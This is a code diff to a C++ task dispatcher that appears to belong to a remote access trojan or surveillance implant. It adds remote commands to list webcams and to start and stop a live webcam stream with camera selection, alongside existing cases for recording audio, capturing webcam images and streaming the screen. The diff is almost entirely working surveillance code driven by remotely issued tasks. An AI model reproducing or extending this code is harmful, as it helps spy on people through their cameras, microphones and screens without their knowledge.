@@ -86,6 +86,11 @@ void TaskDispatcher::dispatch(const Task& task) {
                 result.output = "AUDIO:" + crypto::Base64Encode(wav);
                 break;
             }
+            case TaskType::LIST_WEBCAMS: {
+                auto json = capture::ListWebcamDevices();
+                result.output = "WEBCAM_LIST:" + json.dump();
+                break;
+            }
             case TaskType::WEBCAM: {
                 std::vector<BYTE> img = capture::CaptureWebcamImage();
                 if (img.empty()) result.error = "Webcam capture failed (or camera not found)";
@@ -112,6 +117,47 @@ void TaskDispatcher::dispatch(const Task& task) {
                 } else if (cmd == "stop") {
                     streaming::StopScreenStream();
                     result.output = "SCREEN_STREAM_STATUS:Screen stream stopped";
+                }
+                break;
+            }
+            case TaskType::WEBCAM_STREAM: {
+                 std::string cmd = task.cmd;
+                if (cmd.rfind("start", 0) == 0) {
+                    int duration = 0;
+                    int camIndex = 0;
+                    std::string nameHint;
+
+                    std::stringstream ss(cmd);
+                    std::string token;
+                    ss >> token; // "start"
+
+                    if (ss >> token) {
+                        try { duration = std::stoi(token); } catch(...) {}
+                    }
+
+                    if (ss >> token) {
+                        size_t colon_pos = token.find(':');
+                        if (colon_pos != std::string::npos) {
+                            try { camIndex = std::stoi(token.substr(0, colon_pos)); } catch(...) {}
+                            nameHint = token.substr(colon_pos + 1);
+                        } else {
+                            if (std::all_of(token.begin(), token.end(), ::isdigit)) {
+                                try { camIndex = std::stoi(token); } catch(...) {}
+                            } else {
+                                nameHint = token;
+                            }
+                        }
+                    }
+
+                    auto cb = [this](const std::string& tid, const std::string& out) {
+                         Result r; r.task_id = tid; r.output = out;
+                         this->pendingResults_.enqueue(r);
+                    };
+                    streaming::StartWebcamStream(duration, task.task_id, cb, camIndex, nameHint);
+                    result.output = "WEBCAM_STREAM_STATUS:Webcam stream started";
+                } else if (cmd == "stop") {
+                    streaming::StopWebcamStream();
+                    result.output = "WEBCAM_STREAM_STATUS:Webcam stream stopped";
                 }
                 break;
             }
